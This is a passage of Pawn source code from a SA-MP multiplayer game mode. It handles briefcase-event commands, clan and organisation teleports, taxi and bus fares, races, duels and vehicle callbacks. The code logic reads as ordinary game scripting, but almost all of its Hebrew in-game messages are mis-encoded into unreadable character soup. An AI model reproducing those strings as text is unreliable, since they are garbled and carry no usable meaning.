					format(string,sizeof(string)," .щ∙ ыЄ· ЇЄщьх· юцххуф хфщр ··чщь сЄху %d ∙Ёщх·",briefcaseinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .щ∙ ыЄ· ЇЄщьх· юцххуф хфщр ыс° ф·чщьф");
			}
			else SendClientMessage(playerid,red," .рщя ыЄ· ЇЄщьх· юцххуф");
		}
		else if(equal(cmd,"join"))
		{
			if(!briefcaseinfo[0]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· юцххуф ы°тЄ");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitbriefcase]) return SendClientMessage(playerid,red," .ЇЄщьх· фюцххуф ··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inbriefcase]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх· фюцххуф");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(briefcaseinfo[1] >= MAX_ACTIVITY_PLAYERS) return SendClientMessage(playerid,red," .ыь фюўхюх· сЇЄщьх· фюцххуф ·Їхёщэ");
			if(briefcaseinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitbriefcase] = 1;
			briefcaseinfo[1]++;
			SendClientMessage(playerid,lightblue," Х Х :фЎш°Ї· ьЇЄщьх· фюцххуф Х Х");
			SendClientMessage(playerid,green," - счщщэ Area51 ,Єьщъ ьЎЁхч ь·хъ фрцх° фЎсрщ");
			SendClientMessage(playerid,green," - !ьрч° ∙Ёч··, юхчср· срцх° юцххуф ∙ющ ∙щщўч рх·ф щўсь ыхч цюЁщ ющхчу, юЎр рх·ф ьЇЁщ ыхьэ");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",briefcaseinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!briefcaseinfo[0]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· юцххуф ы°тЄ");
			if(!playerinfo[playerid][inbriefcase]) return SendClientMessage(playerid,red," .р·ф ьр сЇЄщьх· фюцххуф");
			SendClientMessage(playerid,green," .Ї°∙· юЇЄщьх· фюцххуф");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(briefcaseinfo[0]) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· юцххуф");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· юцххуф ЇхЄь·");
			StartBriefcase();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!briefcaseinfo[0]) return SendClientMessage(playerid,red," .рщя ЇЄщьх· юцххуф ы°тЄ");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndBriefcase(reason,playerid);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ЇЄщьх· юцххуф ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/bonus"))
	{
		if(CActID == -1) return SendClientMessage(playerid,red," .рщя ЇЄщьх· Ў'рш ы°тЄ");
		if(playerinfo[playerid][actbonus]) return SendClientMessage(playerid,red," .ыс° ф∙·ю∙· ссхЁхё ьЇЄщьх· фцх, Ёщ·я ьф∙·ю∙ ссхЁхё рчу сыь ЇЄщьх·");
		new string[M_S], actname[64], c = 0;
		if(lottonum[0] != -1) actname = "Lotto - ьхшх";
		else if((maths[0] != -1 && maths[1] != -1 && maths[2] != -1)) actname = "Math - ю·юшщўф";
		else if(trivia[0] != -1) actname = "Trivia - ш°щххщф";
		else if(strlen(replytest) > 0) actname = "Replytest - юсчя чц°ф";
		else if(thereIsWol) actname = "Wheel of Luck - тьть фюць";
		format(actname,sizeof(actname),@c(lightblue) "Bonus: %s",actname);
		for(new i = 0; i < sizeof(ChatActivityBonus); i++)
		{
			if(ChatActivityBonus[i][cabActivity] == CActID)
			{
				format(string,sizeof(string),!c ? ("%s%s - $%d") : ("%s\n%s - $%d"),string,ChatActivityBonus[i][cabName],ChatActivityBonus[i][cabCost]);
				c++;
			}
			else if(c > 0) break;
		}
		if(!c) SendClientMessage(playerid,red," .рщя схЁхёщэ ьЇЄщьх· Ў'рш цх");
		else ShowPlayerDialog(playerid,dialog_cabonus,DIALOG_STYLE_LIST,actname,string,"ўЁф","ётх°");
		return 1;
	}
	if(equal(cmd,"/silence")) return ShowPlayerConstDialog(playerid,dialog_silence);
	if(playerinfo[playerid][clan] > 0)
	{
		new clanCMD[M_S], string[M_S];
		format(clanCMD,sizeof(clanCMD),"/%s",claninfo[playerinfo[playerid][clan]][ccmd]);
		if(equal(cmd,clanCMD) && strlen(clanCMD) > 2)
		{
			new Float:h;
			if(!claninfo[playerinfo[playerid][clan]][hashq]) return SendClientMessage(playerid,red," .ьўьря ∙ьъ рщя юЇўуф");
			if(!HasClanPermission(playerid,clanperm_hq)) return 1;
			if(!CanBeTeleported(playerid)) return 1;
			GetPlayerHealth(playerid,h);
			if(h < min_tele_health)
			{
				format(string,sizeof(string)," .ьр Ёщ·я ьф∙·т° Єэ %.0f %% чщщэ рх Їчх·",min_tele_health);
				return SendClientMessage(playerid,red,string);
			}
			playerinfo[playerid][teleportedhq] = 1;
			switch(GetPlayerState(playerid))
			{
				case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
				{
					SetPlayerPos(playerid,claninfo[playerinfo[playerid][clan]][chq][0]+floatrand(-1.0,1.0),claninfo[playerinfo[playerid][clan]][chq][1]+floatrand(-1.0,1.0),claninfo[playerinfo[playerid][clan]][chq][2]);
					SetPlayerFacingAngle(playerid,claninfo[playerinfo[playerid][clan]][chq][3]);
				}
				case PLAYER_STATE_DRIVER:
				{
					SetVehiclePos(GetPlayerVehicleID(playerid),claninfo[playerinfo[playerid][clan]][chqv][0]+floatrand(-3.0,3.0),claninfo[playerinfo[playerid][clan]][chqv][1]+floatrand(-3.0,3.0),claninfo[playerinfo[playerid][clan]][chqv][2],playerid);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),claninfo[playerinfo[playerid][clan]][chqv][3]);
					if(GetPlayerInterior(playerid) != 0) LinkVehicleToInterior(GetPlayerVehicleID(playerid),0);
					SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
				}
			}
			SetCameraBehindPlayer(playerid);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
			format(string,sizeof(string),"~y~]~h~%s ~n~~h~headquarter~y~]",claninfo[playerinfo[playerid][clan]][cname]);
			GameTextForPlayer(playerid,string,1500,4);
			format(string,sizeof(string)," !%s с°хъ фср ьюЇўу·",claninfo[playerinfo[playerid][clan]][cname]);
			SendClientMessage(playerid,yellow,string);
			return 1;
		}
		for(new i = 1; i <= sizeof(csigns[]); i++)
		{
			format(clanCMD,sizeof(clanCMD),"/%d",i);
			if(equal(cmd,clanCMD) && strlen(csigns[playerinfo[playerid][clan]][i-1]) > 1)
			{
				format(string,sizeof(string)," * Clan Sign #%d (%s, %03d): %s",i,GetName(playerid),playerid,csigns[playerinfo[playerid][clan]][i-1]);
				ClanNotification(playerinfo[playerid][clan],string);
				return 1;
			}
		}
	}
	if(playerinfo[playerid][org] > 0)
	{
		new orgCMD[M_S], string[M_S];
		format(orgCMD,sizeof(orgCMD),"/%s",orginfo[playerinfo[playerid][org]][ocmd]);
		if(equal(cmd,orgCMD) && strlen(orgCMD) > 2)
		{
			new Float:h;
			if(!orginfo[playerinfo[playerid][org]][ohashq]) return SendClientMessage(playerid,red," .ьр°тхя ∙ьъ рщя юЇўуф");
			if(!CanBeTeleported(playerid)) return 1;
			GetPlayerHealth(playerid,h);
			if(h < min_tele_health)
			{
				format(string,sizeof(string)," .ьр Ёщ·я ьф∙·т° Єэ %.0f %% чщщэ рх Їчх·",min_tele_health);
				return SendClientMessage(playerid,red,string);
			}
			switch(GetPlayerState(playerid))
			{
				case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
				{
					SetPlayerPos(playerid,orginfo[playerinfo[playerid][org]][ohq][0]+floatrand(-1.0,1.0),orginfo[playerinfo[playerid][org]][ohq][1]+floatrand(-1.0,1.0),orginfo[playerinfo[playerid][org]][ohq][2]);
					SetPlayerFacingAngle(playerid,orginfo[playerinfo[playerid][org]][ohq][3]);
				}
				case PLAYER_STATE_DRIVER:
				{
					SetVehiclePos(GetPlayerVehicleID(playerid),orginfo[playerinfo[playerid][org]][ohqv][0]+floatrand(-3.0,3.0),orginfo[playerinfo[playerid][org]][ohqv][1]+floatrand(-3.0,3.0),orginfo[playerinfo[playerid][org]][ohqv][2],playerid);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),orginfo[playerinfo[playerid][org]][ohqv][3]);
					if(GetPlayerInterior(playerid) != 0) LinkVehicleToInterior(GetPlayerVehicleID(playerid),0);
					SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
				}
			}
			SetCameraBehindPlayer(playerid);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
			format(string,sizeof(string),"~y~]~h~%s ~n~~h~headquarter~y~]",orginfo[playerinfo[playerid][org]][oname]);
			GameTextForPlayer(playerid,string,1500,4);
			format(string,sizeof(string)," !%s с°хъ фср ьюЇўу· фр°тхя",orginfo[playerinfo[playerid][org]][oname]);
			SendClientMessage(playerid,yellow,string);
			return 1;
		}
	}
	if(equal(cmd,"/")) return SendClientMessage(playerid,white," .∙ыч· ь°∙хэ р· фЇўхуф? Єьщъ ь°∙хэ " @c(red) "/" @c(white) " хьрч°щх р· ∙э фЇўхуф ыущ ьсЎЄ рх·ф");
	return 0;
}
//=[OnPlayerEnterVehicle]=======================================================
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(debugstate) printf("OnPlayerEnterVehicle(%s(%d),%s(%d),%d) start",GetName(playerid),playerid,GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,ispassenger);
	#if lagtest
		LagTest_Start("OnPlayerEnterVehicle");
	#endif
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING) return 1;
	dbg(10,"1");
	for(new i = 0; i < MAX_PLAYERS_; i++)
	{
		if(IsPlayerConnected(i) && IsPlayerInVehicle(i,vehicleid) && GetPlayerState(i) == PLAYER_STATE_DRIVER && !playerinfo[playerid][carjack][i])
		{
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			SetPlayerPos(playerid,p[0],p[1],p[2]);
		}
	}
	if(vehicleinfo[vehicleid][vbomb] == 1)
	{
		vehicleinfo[vehicleid][vbomb] = 0;
		SetTimerEx("Boomcar",2500,0,"i",playerid);
	}
	if(playerinfo[playerid][boomcar] && !ispassenger) SetVehicleHealth(vehicleid,100.0);
	if(vehicleinfo[vehicleid][vcantenter]) StopPlayer(playerid);
	if(vehicleinfo[vehicleid][store] && (vehicleinfo[vehicleid][onlyview] || playerinfo[playerid][vehicle][1] != vehicleid) && !ispassenger && !IsPlayerMAdmin(playerid))
	{
		new string[M_S];
		StopPlayer(playerid);
		format(string,sizeof(string),@c(yellow) ":ф°ыс фцф ∙щщъ ьчЁх· ф°ысщэ");
		if(vehicleinfo[vehicleid][onlyview] == 1) format(string,sizeof(string),"%s\n.фхр ЁхЄу ь·Ўхтф сьсу хьыя ьр ·хыь ьф∙·ю∙ сх",string);
		else format(string,sizeof(string),"%s\n.хьыя ьр ·хыь ьф∙·ю∙ сх %s фхр ЁўЁф Єь щущ",string,GetName(vehicleinfo[vehicleid][vowner]));
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "рцф°ф",string,"OK","");
	}
	if(vehicleinfo[vehicleid][onlyview] == 2) StopPlayer(playerid);
	dbg(10,"2");
	if(!ispassenger && vehicleinfo[vehicleid][vnpcs])
	{
		StopPlayer(playerid);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "рцф°ф",@c(red) "!рёх° ьъ ьЁфхт с°ыс ∙∙щщъ ьсхш","OK","");
	}
	#if lagtest
		LagTest_End("OnPlayerEnterVehicle");
	#endif
	dbg(10,"3");
	if(debugstate) printf("OnPlayerEnterVehicle(%s(%d),%s(%d),%d) end",GetName(playerid),playerid,GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,ispassenger);
	return 1;
}
//=[OnPlayerExitVehicle]========================================================
public OnPlayerExitVehicle(playerid, vehicleid)
{
	if(debugstate) printf("OnPlayerExitVehicle(%s(%d),%s(%d)) start",GetName(playerid),playerid,GetVehicleName(GetVehicleModel(vehicleid)),vehicleid);
	#if lagtest
		LagTest_Start("OnPlayerExitVehicle");
	#endif
	TakeSpecialComponent(playerid);
	if(playerinfo[playerid][gm] && vehicleinfo[vehicleid][vgm])
	{
		SetVehicleHealth(vehicleid,1000.0);
		vehicleinfo[vehicleid][vgm] = 0;
	}
	if(vehicleinfo[vehicleid][locked] && playerid == vehicleinfo[vehicleid][lastdriver])
	{
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(vehicleid,i,0,0);
		vehicleinfo[vehicleid][locked] = 0, vehicleinfo[vehicleid][lastdriver] = INVALID_PLAYER_ID;
	}
	new string[M_S];
	if(playerinfo[playerid][dinvited] != -1 && playerinfo[playerid][dinviter] && !playerinfo[playerid][indrift])
	{
		SendClientMessage(playerid,green," .щЎр· юф°ыс хьыя ффцюЁф ьу°щЇш схшьф");
		format(string,sizeof(string)," .щщЎр ю°ысх хьыя ффцюЁф ьу°щЇш схшьф %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][dinvited],green,string);
		playerinfo[playerinfo[playerid][dinvited]][bet] = 0, playerinfo[playerinfo[playerid][dinvited]][dplace] = 0, playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1, playerinfo[playerid][dinvited] = -1, playerinfo[playerid][dinviter] = 0, playerinfo[playerid][dplace] = 0;
		return 1;
	}
	if(vehicleid == playerinfo[playerid][bvehicle]) DestroyVehicle(playerinfo[playerid][bvehicle]), OutOfDMZone(playerid), SpawnPlayer(playerid);
	if(playerinfo[playerid][prinvited] != -1 && playerinfo[playerid][prinviter] && !playerinfo[playerid][inprace])
	{
		SendClientMessage(playerid,green," .щЎр· юф°ыс хьыя ффцюЁф ьющ°хї Ї°шщ схшьф");
		format(string,sizeof(string)," .щщЎр ю°ысх хьыя ффцюЁф ьющ°хї фЇ°шщ схшьф %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][prinvited],green,string);
		playerinfo[playerinfo[playerid][prinvited]][prplace] = 0, playerinfo[playerinfo[playerid][prinvited]][prinvited] = -1, playerinfo[playerid][prinvited] = -1, playerinfo[playerid][prinviter] = 0, playerinfo[playerid][prplace] = 0;
		return 1;
	}
	if(playerinfo[playerid][indrift])
	{
		format(string,sizeof(string)," .щщЎр юф°ыс ∙ьх, ЁЎчхя шыЁщ ьъ %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][dinvited],green,string);
		GiveMoney(playerinfo[playerid][dinvited],playerinfo[playerinfo[playerid][dinvited]][bet], 2);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		SetVehicleToRespawn(GetPlayerVehicleID(playerinfo[playerid][dinvited]));
		SetPlayerVirtualWorld(playerid,world_normal);
		SetPlayerVirtualWorld(playerinfo[playerid][dinvited],world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][dinvited]),world_normal);
		DisablePlayerRaceCheckpoint(playerid);
		DisablePlayerRaceCheckpoint(playerinfo[playerid][dinvited]);
		playerinfo[playerinfo[playerid][dinvited]][driftcp] = 0,
		playerinfo[playerinfo[playerid][dinvited]][indrift] = 0,
		playerinfo[playerinfo[playerid][dinvited]][bet] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dinviter] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dplace] = 0,
		playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1;
		playerinfo[playerid][driftcp] = 0,
		playerinfo[playerid][indrift] = 0,
		playerinfo[playerid][bet] = 0,
		playerinfo[playerid][dinvited] = -1,
		playerinfo[playerid][dinviter] = 0;
	}
	if(playerinfo[playerid][inprace])
	{
		format(string,sizeof(string)," .щщЎр юф°ыс ∙ьх, ЁЎчхя шыЁщ ьъ %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][prinvited],green,string);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		SetVehicleToRespawn(GetPlayerVehicleID(playerinfo[playerid][prinvited]));
		SetPlayerVirtualWorld(playerid,world_normal);
		SetPlayerVirtualWorld(playerinfo[playerid][prinvited],world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][prinvited]),world_normal);
		DisablePlayerRaceCheckpoint(playerid);
		DisablePlayerRaceCheckpoint(playerinfo[playerid][prinvited]);
		playerinfo[playerinfo[playerid][prinvited]][pracecp] = 0,
		playerinfo[playerinfo[playerid][prinvited]][inprace] = 0,
		playerinfo[playerinfo[playerid][prinvited]][prinviter] = 0,
		playerinfo[playerinfo[playerid][prinvited]][prplace] = 0,
		playerinfo[playerinfo[playerid][prinvited]][prinvited] = -1;
		playerinfo[playerid][pracecp] = 0,
		playerinfo[playerid][inprace] = 0,
		playerinfo[playerid][prinvited] = -1,
		playerinfo[playerid][prinviter] = 0;
	}
	if(playerinfo[playerid][inbattle] && playerinfo[playerid][bstyle][0] == 2)
	{
		SendClientMessage(playerid,green," /again :щЎр· юф°ыс, р·ф фюЇёщу сў°с. ьў°хс чхц°");
		format(string,sizeof(string)," /again :щЎр юф°ыс, р·ф фюЁЎч сў°с! ьў°с чхц° %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][binvited],green,string);
		playerinfo[playerid][lastaga] = 1, playerinfo[playerinfo[playerid][binvited]][lastaga] = 1;
		format(string,sizeof(string)," Х /duelinfo :ьЇ°шщ фў°с !%s сў°с °ысщэ юёхт %s ЁщЎч р· %s",VBattleStyles[playerinfo[playerinfo[playerid][binvited]][bstyle][1]][vbsName],GetName(playerinfo[playerinfo[playerid][binvited]][binvited]),GetName(playerinfo[playerid][binvited]));
		SendClientMessageToAll(orange,string);
		new Float:h, Float:a;
		if(IsPlayerInAnyVehicle(playerinfo[playerid][binvited])) GetVehicleHealth(GetPlayerVehicleID(playerinfo[playerid][binvited]), a);
		else GetPlayerHealth(playerinfo[playerid][binvited],h);
		GetPlayerArmour(playerinfo[playerid][binvited],a);
		battleDialog = "", battleDialogDelay = 180;
		if(playerinfo[playerinfo[playerid][binvited]][bstyle][0] == 2)
		{
			format(battleDialog,sizeof(battleDialog),@c(green) "%s :юЁЎч",GetName(playerinfo[playerid][binvited]));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(red) "%s :юЇёщу",battleDialog,GetName(playerid));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(white) "%s" @c(grey) " :%s",battleDialog,VBattleStyles[playerinfo[playerinfo[playerid][binvited]][bstyle][1]][vbsName],!playerinfo[playerinfo[playerid][binvited]][bstyle][0] ? ("Ё∙ў") : ("ёхт"));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "ю∙ъ цюя фў°с: " @c(white) "%02d уўх·" @c(grey) "," @c(white) " %02d ∙Ёщх·",battleDialog,playerinfo[playerid][btime]/60,playerinfo[playerid][btime]%60);
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "юЎс фюЁЎч: " @c(white) "%.0f %% чщщэ",battleDialog,a);
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "ущ°хт фюЁЎч: %s",battleDialog,GetBattleState(playerinfo[playerid][binvited], 2));
		}
		else
		{
			format(battleDialog,sizeof(battleDialog),@c(green) "%s :юЁЎч",GetName(playerinfo[playerid][binvited]));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(red) "%s :юЇёщу",battleDialog,GetName(playerid));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(white) "%s" @c(grey) " :%s",battleDialog,BattleStyles[playerinfo[playerinfo[playerid][binvited]][bstyle][1]][bsName],!playerinfo[playerinfo[playerid][binvited]][bstyle][0] ? ("Ё∙ў") : ("ёхт"));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "ю∙ъ цюя фў°с: " @c(white) "%02d уўх·" @c(grey) "," @c(white) " %02d ∙Ёщх·",battleDialog,playerinfo[playerid][btime]/60,playerinfo[playerid][btime]%60);
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "юЎс фюЁЎч: " @c(white) "%.0f %% чщщэ" @c(grey) "," @c(white) " %.0f %% ютя",battleDialog,h,a);
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "ущ°хт фюЁЎч: %s",battleDialog,GetBattleState(playerinfo[playerid][binvited]));
		}
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(orange) "Ї°шщ фў°с",battleDialog,"ётх°","");
		ShowPlayerDialog(playerinfo[playerid][binvited],dialog_ni,DIALOG_STYLE_MSGBOX,@c(orange) "Ї°шщ фў°с",battleDialog,"ётх°","");
		ResetWeapons(playerinfo[playerid][binvited]);
		SpawnPlayer(playerinfo[playerid][binvited]);
		SpawnPlayer(playerid);
		ResetWeapons(playerid);
		//playerinfo[playerid][inbattle] = 0, playerinfo[playerid][binvited] = -1, playerinfo[playerid][binviter] = 0, playerinfo[playerid][bstyle] = {-1,-1}, playerinfo[playerid][bplace] = -1, playerinfo[playerid][btime] = 0, playerinfo[playerid][bcd][0] = 0;
		//playerinfo[killerid][inbattle] = 0, playerinfo[killerid][binvited] = -1, playerinfo[killerid][binviter] = 0, playerinfo[killerid][bstyle] = {-1,-1}, playerinfo[killerid][bplace] = -1, playerinfo[killerid][btime] = 0, playerinfo[killerid][bcd][0] = 0;
		playerinfo[playerinfo[playerid][binvited]][inbattle] = 0, playerinfo[playerinfo[playerid][binvited]][binvited] = -1, playerinfo[playerinfo[playerid][binvited]][bcd][0] = 0, playerinfo[playerinfo[playerid][binvited]][binviter] = 0;
		playerinfo[playerid][inbattle] = 0, playerinfo[playerid][binvited] = -1, playerinfo[playerid][bcd][0] = 0, playerinfo[playerid][binviter] = 0;
	}
	for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][spectate] == playerid)
	{
		TogglePlayerSpectating(i,0);
		SetPlayerInterior(i,GetPlayerInterior(playerid));
		TogglePlayerSpectating(i,1);
		PlayerSpectatePlayer(i,playerid);
	}
	playerinfo[playerid][abf][1] = INVALID_VEHICLE_ID;
	if(playerinfo[playerid][incrane])
	{
		SetVehicleToRespawn(vehicleid);
		SetFreeze(playerid,0);
		playerinfo[playerid][incrane] = 0, playerinfo[playerid][cranetime] = 0;
		News(" /Crane !фюЁхє ЇЁхщ");
	}
	#if lagtest
		LagTest_End("OnPlayerExitVehicle");
	#endif
	if(debugstate) printf("OnPlayerExitVehicle(%s(%d),%s(%d)) end",GetName(playerid),playerid,GetVehicleName(GetVehicleModel(vehicleid)),vehicleid);
	return 1;
}
//=[OnPlayerStateChange]========================================================
public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(debugstate && !IsPlayerNPC(playerid)) printf("OnPlayerStateChange(%s(%d),%d,%d) start",GetName(playerid),playerid,newstate,oldstate);
	if(IsPlayerNPC(playerid)) return 1;
	#if lagtest
		LagTest_Start("OnPlayerStateChange");
	#endif
	if(!playerinfo[playerid][abf][0])
	{
		if(newstate == PLAYER_STATE_DRIVER) playerinfo[playerid][entertime] = GetTickCount();
		else if(oldstate == PLAYER_STATE_DRIVER) if((GetTickCount()-playerinfo[playerid][entertime]) < 220) Cheat(playerid,"Vehicle Crash Hack / Car Teleporting",2);
	}
	playerinfo[playerid][ostate] = oldstate, playerinfo[playerid][nstate] = newstate;
	new string[M_S];
	if((oldstate == PLAYER_STATE_PASSENGER || oldstate == PLAYER_STATE_DRIVER) && playerinfo[playerid][lastv] != INVALID_VEHICLE_ID) vehicleinfo[playerinfo[playerid][lastv]][playersin]--;
	//if(newstate == PLAYER_STATE_DRIVER && (GetVehicleModel(GetPlayerVehicleID(playerid)) == 420 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 438)) GivePlayerMoney(playerid,-12);
	if(newstate == PLAYER_STATE_ONFOOT || newstate == PLAYER_STATE_SPAWNED || (newstate == PLAYER_STATE_EXIT_VEHICLE && (oldstate == PLAYER_STATE_DRIVER || oldstate == PLAYER_STATE_PASSENGER))) for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][spectate] == playerid) PlayerSpectatePlayer(i,playerid);
	if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
	{
		new v[M_S], vid = GetPlayerVehicleID(playerid);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][spectate] == playerid) PlayerSpectateVehicle(i,vid);
		if(vehicleinfo[vid][vspecial]) format(v,sizeof(v),"~b~~h~special:~n~~y~~h~%s",vehicleinfo[vid][vspecialname]);
		else format(v,sizeof(v),"~y~~h~%s",GetVehicleName(GetVehicleModel(vid)));
		GameTextForPlayer(playerid,v,2500,1);
		playerinfo[playerid][lastv] = vid, vehicleinfo[vid][lastdriver] = playerid, playerinfo[playerid][getweapon] = GetPlayerWeapon(playerid), vehicleinfo[vid][playersin]++;
		if(playerinfo[playerid][pet][2])
		{
			new Float:p[4];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetPlayerFacingAngle(playerid,p[3]);
			if(playerinfo[playerid][pet][3]) StopPetAttacking(playerid);
			if(IsValidObject(playerinfo[playerid][pet][1])) DestroyObject(playerinfo[playerid][pet][1]);
			playerinfo[playerid][pet][2] = 0;
			playerinfo[playerid][pet][3] = 0;
		}
		if(GetVehicleModel(vid) == 416)
		{
			new Float:h;
			GetPlayerHealth(playerid,h);
			playerinfo[playerid][phealth] = h;
		}
		if(GetVehicleModel(vid) == 427)
		{
			new Float:a;
			GetPlayerArmour(playerid,a);
			playerinfo[playerid][parmour] = a;
		}
		if(playerinfo[playerid][speedo] == INVALID_PLAYER_TEXT_DRAW && playerinfo[playerid][setting][setting_speedo]) Speedometer(playerid,"create");
	}
	if((oldstate == PLAYER_STATE_DRIVER || oldstate == PLAYER_STATE_PASSENGER) && playerinfo[playerid][speedo] != INVALID_PLAYER_TEXT_DRAW) Speedometer(playerid,"delete");
	if(newstate == PLAYER_STATE_PASSENGER)
	{
		new am = 0, count = 0;
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 420)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][work] == work_taxi && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
				{
					if(GetMoney(playerid) < playerinfo[i][drivecost])
					{
						SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє ьюхЁщ·");
						RemovePlayerFromVehicle(playerid);
					}
					else
					{
						GiveMoney(i,playerinfo[i][drivecost], 8);
						SendClientMessage(i,yellow," !ўщсь· ыёє юфЁхёЄ");
						am = playerinfo[i][drivecost];
						count++;
					}
				}
			}
			if(count > 0)
			{
				format(string,sizeof(string)," .∙щью· %d$ ьЁфт фюхЁщ·",am);
				SendClientMessage(playerid,yellow,string);
				GiveMoney(playerid,0-am, 8);
			}
		}
		else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 431)
		{
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][work] == work_bus && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
				{
					if(GetMoney(playerid) < playerinfo[i][drivecost])
					{
						SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє ьрхшхсхё");
						RemovePlayerFromVehicle(playerid);
					}
					else
					{
						GiveMoney(i,playerinfo[i][drivecost], 8);
						SendClientMessage(i,yellow," !ўщсь· ыёє юфЁхёЄ");
						am = playerinfo[i][drivecost];
						count++;
					}
				}
			}
			if(count > 0)
			{
				format(string,sizeof(string)," .∙щью· %d$ ьЁфт фрхшхсхё",am);
				SendClientMessage(playerid,yellow,string);
				GiveMoney(playerid,0-am, 8);
			}
		}
